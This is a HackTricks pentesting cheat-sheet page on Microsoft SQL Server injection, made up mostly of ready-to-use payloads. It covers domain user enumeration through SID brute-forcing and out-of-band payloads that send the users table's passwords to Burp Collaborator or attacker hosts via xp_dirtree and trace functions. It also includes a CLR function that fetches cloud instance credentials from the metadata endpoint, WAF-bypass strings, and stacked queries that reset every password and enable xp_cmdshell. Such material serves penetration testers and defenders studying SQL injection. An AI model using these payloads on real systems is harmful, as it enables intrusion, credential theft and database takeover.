# MSSQL Injection

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Active Directory enumeration

It may be possible to **enumerate domain users via SQL injection inside a MSSQL** server using the following MSSQL functions:

* **`SELECT DEFAULT_DOMAIN()`**: Get current domain name.
* **`master.dbo.fn_varbintohexstr(SUSER_SID('DOMAIN\Administrator'))`**: If you know the name of the domain (_DOMAIN_ in this example) this function will return the **SID of the user Administrator** in hex format. This will look like `0x01050000000[...]0000f401`, note how the **last 4 bytes** are the number **500** in **big endian** format, which is the **common ID of the user administrator**.\
  This function will allow you to **know the ID of the domain** (all the bytes except of the last 4).
* **`SUSER_SNAME(0x01050000000[...]0000e803)`** : This function will return the **username of the ID indicated** (if any), in this case **0000e803** in big endian == **1000** (usually this is the ID of the first regular user ID created). Then you can imagine that you can brute-force user IDs from 1000 to 2000 and probably get all the usernames of the users of the domain. For example using a function like the following one:

```python
def get_sid(n):
	domain = '0x0105000000000005150000001c00d1bcd181f1492bdfc236'
	user = struct.pack('<I', int(n))
	user = user.hex()
	return f"{domain}{user}" #if n=1000, get SID of the user with ID 1000
```

## **Alternative Error-Based vectors**

Error-based SQL injections typically resemble constructions such as `+AND+1=@@version--` and variants based on the «OR» operator. Queries containing such expressions are usually blocked by WAFs. As a bypass, concatenate a string using the %2b character with the result of specific function calls that trigger a data type conversion error on sought-after data.

Some examples of such functions:

* `SUSER_NAME()`
* `USER_NAME()`
* `PERMISSIONS()`
* `DB_NAME()`
* `FILE_NAME()`
* `TYPE_NAME()`
* `COL_NAME()`

Example use of function `USER_NAME()`:

```
https://vuln.app/getItem?id=1'%2buser_name(@@version)--
```

![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/6.png)

## SSRF

### `fn_xe_file_target_read_file`

```
https://vuln.app/getItem?id= 1+and+exists(select+*+from+fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select+pass+from+users+where+id=1)%2b'.064edw6l0h153w39ricodvyzuq0ood.burpcollaborator.net\1.xem',null,null))
```

![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/3.png)

**Permissions:** Requires **`VIEW SERVER STATE`** permission on the server.

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
# Or doing
Use master;
EXEC sp_helprotect 'fn_xe_file_target_read_file';
```

### `fn_get_audit_file`

```
https://vuln.app/getItem?id= 1%2b(select+1+where+exists(select+*+from+fn_get_audit_file('\\'%2b(select+pass+from+users+where+id=1)%2b'.x53bct5ize022t26qfblcsxwtnzhn6.burpcollaborator.net\',default,default)))
```

![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/2.png)

**Permissions:** Requires the **`CONTROL SERVER`** permission.

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_get_audit_file';
```

### `fn_trace_gettabe`

```
https://vuln.app/ getItem?id=1+and+exists(select+*+from+fn_trace_gettable('\\'%2b(select+pass+from+users+where+id=1)%2b'.ng71njg8a4bsdjdw15mbni8m4da6yv.burpcollaborator.net\1.trc',default))
```

![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/1.png)

**Permissions:** Requires the **`CONTROL SERVER`** permission.

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_trace_gettabe';
```

### `xp_dirtree`, `xp_fileexists`, `xp_subdirs` <a href="#limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures" id="limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures"></a>

The most common method to make a network call yosqlu will come across using MSSQL is the usage of the Stored Procedure `xp_dirtree`, which weirdly is undocumented by Microsoft, which caused it to be [documented by other folks on the Internet](https://www.baronsoftware.com/Blog/sql-stored-procedures-get-folder-files/). This method has been used in [multiple examples](https://www.notsosecure.com/oob-exploitation-cheatsheet/) of [Out of Band Data exfiltration](https://gracefulsecurity.com/sql-injection-out-of-band-exploitation/) posts on the Internet.

Essentially,

```sql
DECLARE @user varchar(100);
SELECT @user = (SELECT user);  
EXEC ('master..xp_dirtree "\\'+@user+'.attacker-server\aa"');
```

Much like MySQL’s `LOAD_FILE`, you can use `xp_dirtree` to make a network request to **only TCP port 445**. You cannot control the port number, but can read information from network shares.

**PS:** This does not work on `Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)` running on a `Windows Server 2016 Datacenter` in the default config.

There are **other** stored procedures \*\*\*\* [**like `master..xp_fileexist`**](https://social.technet.microsoft.com/wiki/contents/articles/40107.xp-fileexist-and-its-alternate.aspx) or **`xp_subdirs`** that can be used for similar results.

### `xp_cmdshell` <a href="#master-xp-cmdshell" id="master-xp-cmdshell"></a>

Obviously you could also use **`xp_cmdshell`** to **execute** something that triggers a **SSRF**. For more info **read the relevant section** in the page:

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

### MSSQL User Defined Function - SQLHttp <a href="#mssql-user-defined-function-sqlhttp" id="mssql-user-defined-function-sqlhttp"></a>

It is fairly straightforward to write a **CLR UDF** (Common Language Runtime User Defined Function - code written with any of the **.NET** languages and compiled into a **DLL**) and **load it within MSSQL for custom functions**. This, however, **requires `dbo` access** so may not work unless the web application connection to the database **as `sa` or an Administrator role**.

[This Github repo has the Visual Studio project and the installation instructions](https://github.com/infiniteloopltd/SQLHttp) to load the binary into MSSQL as a CLR assembly and then invoke HTTP GET requests from within MSSQL.

The `http.cs` code uses the `WebClient` class to make a GET request and fetch the content as specified

```csharp
using System.Data.SqlTypes;
using System.Net;

public partial class UserDefinedFunctions
{
    [Microsoft.SqlServer.Server.SqlFunction]
    public static SqlString http(SqlString url)
    {
        var wc = new WebClient();
        var html = wc.DownloadString(url.Value);
        return new SqlString (html);
    }
}
```

In the installation instructions, run the following before the `CREATE ASSEMBLY` query to add the SHA512 hash of the assembly to the list of trusted assemblies on the server (you can see the list using `select * from sys.trusted_assemblies;`)

```sql
EXEC sp_add_trusted_assembly 0x35acf108139cdb825538daee61f8b6b07c29d03678a4f6b0a5dae41a2198cf64cefdb1346c38b537480eba426e5f892e8c8c13397d4066d4325bf587d09d0937,N'HttpDb, version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';
```

Once the assembly is added and the function created, we can run the following to make our HTTP requests

```sql
DECLARE @url varchar(max);
SET @url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/s3fullaccess/';
SELECT dbo.http(@url);
```

## **Quick exploitation: Retrieve an entire table in one query**

There exist two simple ways to retrieve the entire contents of a table in one query — the use of the FOR XML or the FOR JSON clause. The FOR XML clause requires a specified mode such as «raw», so in terms of brevity FOR JSON outperforms it.

The query to retrieve the schema, tables and columns from the current database:

```
https://vuln.app/getItem?id=-1'+union+select+null,concat_ws(0x3a,table_schema,table_name,column_name),null+from+information_schema.columns+for+json+auto-- 
```

![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/5.png)

Error-based vectors need an alias or a name, since the output of expressions without either cannot be formatted as JSON.

```
https://vuln.app/getItem?id=1'+and+1=(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)-- 
```

![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/7.png)

## **Retrieving the current query**

The current SQL query being executed can be retrieved from access `sys.dm_exec_requests` and `sys.dm_exec_sql_text`:

```
https://vuln.app/getItem?id=-1%20union%20select%20null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null
```

![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/9.png)

**Permissions:** If the user has VIEW SERVER STATE permission on the server, the user will see all executing sessions on the instance of SQL Server; otherwise, the user will see only the current session.

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
```

## **Little tricks for WAF bypasses**

Non-standard whitespace characters: %C2%85 или %C2%A0:

```
https://vuln.app/getItem?id=1%C2%85union%C2%85select%C2%A0null,@@version,null-- 
```

Scientific (0e) and hex (0x) notation for obfuscating UNION:

```
https://vuln.app/getItem?id=0eunion+select+null,@@version,null--
 
https://vuln.app/getItem?id=0xunion+select+null,@@version,null-- 
```

A period instead of a whitespace between FROM and a column name:

```
https://vuln.app/getItem?id=1+union+select+null,@@version,null+from.users-- 
```

\N separator between SELECT and a throwaway column:

```
https://vuln.app/getItem?id=0xunion+select\Nnull,@@version,null+from+users-- 
```

### WAF Bypass with unorthodox stacked queries

According to [**this blog post**](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/) it's possible to stack queries in MSSQL without using ";":

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

So for example, multiple quesries such as:

```sql
use [tempdb]
create table [test] ([id] int)
insert [test] values(1)
select [id] from [test]
drop table[test]
```

Can be reduced to:

```sql
use[tempdb]create/**/table[test]([id]int)insert[test]values(1)select[id]from[test]drop/**/table[test]
```

Therefore it could be possible to bypass different WAFs that doesn't consider this form of stacking queries. For example:

```
# Adding a useless exec() at the end and making the WAF think this isn't a valid querie
admina'union select 1,'admin','testtest123'exec('select 1')--
## This will be:
SELECT id, username, password FROM users WHERE username = 'admina'union select 1,'admin','testtest123'
exec('select 1')--'

# Using weirdly built queries
admin'exec('update[users]set[password]=''a''')--
## This will be:
SELECT id, username, password FROM users WHERE username = 'admin'
exec('update[users]set[password]=''a''')--'

# Or enabling xp_cmdshell
admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
## This will be
select * from users where username = ' admin'
exec('sp_configure''show advanced option'',''1''reconfigure')
exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
```

## References

* [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
* [https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
